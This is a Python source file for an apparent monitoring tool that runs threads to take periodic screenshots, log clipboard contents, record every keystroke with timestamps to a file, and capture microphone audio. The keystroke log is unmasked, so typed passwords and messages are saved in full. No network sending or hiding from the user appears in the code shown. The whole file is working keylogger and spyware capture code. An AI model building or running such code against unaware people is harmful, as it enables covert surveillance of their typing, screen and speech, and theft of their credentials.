import os
import time
import threading
from datetime import datetime
from PIL import ImageGrab
import pyperclip
from pynput import keyboard

import config
import privacy
import logger_setup

logger = logger_setup.get_logger()

# =====================================================================
# LIVE TELEMETRY STATS (SHARED COUNTERS FOR DASHBOARD)
# =====================================================================
stats = {
    "screenshots": 0,
    "keystrokes": 0,
    "clipboard": 0,
    "audio": 0,
    "errors": 0
}

# =====================================================================
# 1. SCREENSHOT MONITOR (WITH TELEMETRY COUNTER)
# =====================================================================
def run_screenshot_monitor(stop_event):
    """Periodically captures the screen and updates screenshot stats."""
    logger.info("Screenshot Monitor thread started.")
    while not stop_event.is_set():
        if stop_event.wait(config.SCREENSHOT_INTERVAL):
            break

        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"screenshot_{timestamp}.png"
            filepath = os.path.join(config.SCREENSHOT_DIR, filename)

            screenshot = ImageGrab.grab()
            if screenshot:
                screenshot.save(filepath)
                stats["screenshots"] += 1
                logger.info(f"Captured screenshot: {filename} (Total: {stats['screenshots']})")
        except OSError as e:
            stats["errors"] += 1
            logger.warning(f"Screen capture OS error: {e}")
        except Exception as e:
            stats["errors"] += 1
            logger.error(f"Unexpected screenshot capture failure: {e}", exc_info=True)

    logger.info("Screenshot Monitor thread stopped cleanly.")


# =====================================================================
# 2. CLIPBOARD MONITOR (WITH TELEMETRY COUNTER)
# =====================================================================
def run_clipboard_monitor(stop_event):
    """Monitors clipboard, sanitizes text, and updates clipboard stats."""
    logger.info("Clipboard Monitor thread started.")
    last_text = ""

    while not stop_event.is_set():
        if stop_event.wait(config.CLIPBOARD_INTERVAL):
            break

        current_text = None
        try:
            current_text = pyperclip.paste()
        except Exception:
            continue

        if current_text and current_text.strip() and current_text != last_text:
            last_text = current_text
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            clean_text = privacy.mask_sensitive_text(current_text.strip())

            try:
                with open(config.CLIPBOARD_FILE, "a", encoding="utf-8") as f:
                    f.write(f"[{timestamp}]\n")
                    f.write(clean_text + "\n")
                    f.write("-" * 40 + "\n")
                stats["clipboard"] += 1
                logger.info(f"Recorded clipboard update (Total: {stats['clipboard']}).")
            except OSError as e:
                stats["errors"] += 1
                logger.error(f"Failed writing clipboard history: {e}")

    logger.info("Clipboard Monitor thread stopped cleanly.")


# =====================================================================
# 3. KEYBOARD MONITOR (WITH TELEMETRY COUNTER)
# =====================================================================
def run_keyboard_monitor(stop_event):
    """Captures keystrokes with in-memory buffering and updates keystroke stats."""
    logger.info("Keyboard Monitor thread started.")

    buffer = []
    buffer_lock = threading.Lock()
    MAX_BUFFER_SIZE = 10

    def flush_to_disk():
        with buffer_lock:
            if not buffer:
                return
            try:
                with open(config.KEYLOG_FILE, "a", encoding="utf-8") as f:
                    f.writelines(buffer)
                buffer.clear()
            except OSError as e:
                stats["errors"] += 1
                logger.error(f"Failed flushing keystrokes to disk: {e}")

    def on_press(key):
        if stop_event.is_set():
            return False

        stats["keystrokes"] += 1
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            key_name = key.char if key.char is not None else f"[{key}]"
        except AttributeError:
            key_name = f"[{key}]"

        log_entry = f"{timestamp} - {key_name}\n"

        with buffer_lock:
            buffer.append(log_entry)
            should_flush = len(buffer) >= MAX_BUFFER_SIZE

        if should_flush:
            flush_to_disk()

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while not stop_event.is_set():
        if stop_event.wait(5):
            break
        flush_to_disk()

    listener.stop()
    flush_to_disk()
    logger.info("Keyboard Monitor thread flushed buffer and stopped cleanly.")


# =====================================================================
# 4. AUDIO MONITOR (WITH TELEMETRY COUNTER)
# =====================================================================
def run_audio_monitor(stop_event):
    """Records audio if enabled and hardware is available."""
    if not config.ENABLE_AUDIO:
        return

    try:
        import sounddevice as sd
        from scipy.io.wavfile import write
    except ImportError:
        logger.warning("sounddevice or scipy not installed. Skipping audio capture.")
        return

    try:
        devices = sd.query_devices()
        has_mic = any(d.get("max_input_channels", 0) > 0 for d in devices)
        if not has_mic:
            logger.warning("No microphone detected. Audio monitoring disabled.")
            return
    except Exception as e:
        stats["errors"] += 1
        logger.error(f"Error querying audio hardware: {e}")
        return

    logger.info("Audio Monitor thread started.")

    while not stop_event.is_set():
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"audio_{timestamp}.wav"
        filepath = os.path.join(config.RECORDING_DIR, filename)

        try:
            total_samples = int(config.AUDIO_DURATION * config.AUDIO_SAMPLE_RATE)
            audio_data = sd.rec(
                total_samples,
                samplerate=config.AUDIO_SAMPLE_RATE,
                channels=config.AUDIO_CHANNELS,
                dtype="int16"
            )

            elapsed = 0
            while elapsed < config.AUDIO_DURATION and not stop_event.is_set():
                time.sleep(0.2)
                elapsed += 0.2

            if stop_event.is_set():
                sd.stop()
                logger.info("Audio recording aborted early due to shutdown.")
                break

            sd.wait()
            write(filepath, config.AUDIO_SAMPLE_RATE, audio_data)
            stats["audio"] += 1
            logger.info(f"Saved audio recording: {filename} (Total: {stats['audio']})")

        except Exception as e:
            stats["errors"] += 1
            logger.error(f"Audio capture failure: {e}")

        if stop_event.wait(config.AUDIO_DURATION):
            break

    try:
        sd.stop()
    except Exception:
        pass
    logger.info("Audio Monitor thread stopped cleanly.")
